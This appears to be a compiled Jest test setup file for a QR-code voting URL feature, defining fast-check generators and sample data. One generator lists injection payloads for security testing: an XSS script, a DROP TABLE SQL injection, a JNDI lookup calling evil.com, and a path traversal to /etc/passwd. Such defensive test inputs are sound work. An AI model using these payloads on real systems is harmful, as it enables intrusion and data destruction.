"use strict";
/**
 * Test setup configuration for QR Code Voting URL feature
 * Configures Jest and fast-check for property-based testing
 */
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
Object.defineProperty(exports, "__esModule", { value: true });
exports.testData = exports.maliciousInputArb = exports.urlParamStringArb = exports.invalidVotePageParamsArb = exports.validVotePageParamsArb = exports.validCandidateInfoArb = exports.expiredTimestampArb = exports.validTimestampArb = exports.validSourceArb = exports.validCategoryArb = exports.invalidCandidateNameArb = exports.validCandidateNameArb = exports.validCandidateIdArb = void 0;
exports.mockConsole = mockConsole;
const fc = __importStar(require("fast-check"));
// ============================================================================
// Global Test Configuration
// ============================================================================
// Extend Jest timeout for property-based tests
jest.setTimeout(30000);
// Configure fast-check global settings
fc.configureGlobal({
    numRuns: 100, // Run each property test 100 times as specified in design
    verbose: process.env.NODE_ENV === 'test' ? 1 : 0,
    seed: process.env.FC_SEED ? parseInt(process.env.FC_SEED, 10) : 42,
});
// ============================================================================
// Test Data Generators for Property-Based Testing
// ============================================================================
/**
 * Generator for valid candidate IDs
 */
exports.validCandidateIdArb = fc.stringOf(fc.constantFrom(...'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_'.split('')), { minLength: 1, maxLength: 50 });
/**
 * Generator for valid candidate names (including Chinese characters)
 */
exports.validCandidateNameArb = fc.stringOf(fc.constantFrom(...'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 -_.()张三李四王五赵六'.split('')), { minLength: 1, maxLength: 50 });
/**
 * Generator for invalid candidate names (too long, empty, or with invalid characters)
 */
exports.invalidCandidateNameArb = fc.oneof(fc.constant(''), // Empty string
fc.string({ minLength: 51 }), // Too long
fc.stringOf(fc.constantFrom('<', '>', '"', "'", '&', '\n', '\t'), { minLength: 1 }) // Invalid characters
);
/**
 * Generator for valid categories
 */
exports.validCategoryArb = fc.option(fc.stringOf(fc.constantFrom(...'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 -_.()最佳员工优秀团队'.split('')), { minLength: 1, maxLength: 30 }), { nil: undefined });
/**
 * Generator for valid sources
 */
exports.validSourceArb = fc.constantFrom('qrcode', 'direct');
/**
 * Generator for valid timestamps (within 24 hours)
 */
exports.validTimestampArb = fc.option(fc.integer({ min: Math.floor(Date.now() / 1000) - 86400, max: Math.floor(Date.now() / 1000) })
    .map(ts => ts.toString()), { nil: undefined });
/**
 * Generator for expired timestamps (older than 24 hours)
 */
exports.expiredTimestampArb = fc.integer({
    min: 0,
    max: Math.floor(Date.now() / 1000) - 86401
}).map(ts => ts.toString());
/**
 * Generator for valid CandidateInfo objects
 */
exports.validCandidateInfoArb = fc.record({
    id: exports.validCandidateIdArb,
    name: exports.validCandidateNameArb,
    category: exports.validCategoryArb,
    metadata: fc.option(fc.dictionary(fc.string(), fc.anything()), { nil: undefined })
});
/**
 * Generator for valid VotePageParams objects
 */
exports.validVotePageParamsArb = fc.record({
    candidateId: exports.validCandidateIdArb,
    candidateName: exports.validCandidateNameArb,
    category: exports.validCategoryArb,
    source: exports.validSourceArb,
    timestamp: exports.validTimestampArb
});
/**
 * Generator for invalid VotePageParams (missing required fields)
 */
exports.invalidVotePageParamsArb = fc.oneof(fc.record({
    // Missing candidateId
    candidateName: exports.validCandidateNameArb,
    source: exports.validSourceArb
}), fc.record({
    // Missing candidateName
    candidateId: exports.validCandidateIdArb,
    source: exports.validSourceArb
}), fc.record({
    // Missing source
    candidateId: exports.validCandidateIdArb,
    candidateName: exports.validCandidateNameArb
}), fc.record({
    // Invalid source
    candidateId: exports.validCandidateIdArb,
    candidateName: exports.validCandidateNameArb,
    source: fc.string().filter(s => s !== 'qrcode' && s !== 'direct')
}));
/**
 * Generator for URL parameter strings
 */
exports.urlParamStringArb = fc.record({
    candidate_id: exports.validCandidateIdArb,
    candidate_name: exports.validCandidateNameArb,
    category: exports.validCategoryArb,
    source: exports.validSourceArb,
    timestamp: exports.validTimestampArb
}).map(params => {
    const pairs = [];
    Object.entries(params).forEach(([key, value]) => {
        if (value !== undefined) {
            pairs.push(`${encodeURIComponent(key)}=${encodeURIComponent(value)}`);
        }
    });
    return pairs.join('&');
});
/**
 * Generator for malicious input strings (for security testing)
 */
exports.maliciousInputArb = fc.oneof(fc.constant('<script>alert("xss")</script>'), fc.constant('"; DROP TABLE users; --'), fc.constant('${jndi:ldap://evil.com/a}'), fc.constant('../../../etc/passwd'), fc.constant('javascript:alert(1)'), fc.stringOf(fc.constantFrom('<', '>', '"', "'", '&', '\n', '\r', '\t'), { minLength: 1, maxLength: 100 }));
// ============================================================================
// Test Utilities
// ============================================================================
/**
 * Helper to create test data for unit tests
 */
exports.testData = {
    validCandidate: {
        id: 'candidate-123',
        name: '张三',
        category: '最佳员工',
        metadata: { department: 'IT' }
    },
    validVoteParams: {
        candidateId: 'candidate-123',
        candidateName: '张三',
        category: '最佳员工',
        source: 'qrcode',
        timestamp: Math.floor(Date.now() / 1000).toString()
    },
    validUser: {
        id: 'user-456',
        username: 'testuser',
        email: 'test@example.com',
        hasVotingRights: true
    }
};
/**
 * Mock console methods for testing
 */
function mockConsole() {
    const originalConsole = { ...console };
    beforeEach(() => {
        jest.spyOn(console, 'log').mockImplementation(() => { });
        jest.spyOn(console, 'warn').mockImplementation(() => { });
        jest.spyOn(console, 'error').mockImplementation(() => { });
    });
    afterEach(() => {
        jest.restoreAllMocks();
    });
    return originalConsole;
}
// ============================================================================
// Global Test Hooks
// ============================================================================
// Clean up after each test
afterEach(() => {
    jest.clearAllMocks();
});
// Global error handler for unhandled promise rejections in tests
process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});
exports.default = {};
//# sourceMappingURL=test-setup.js.map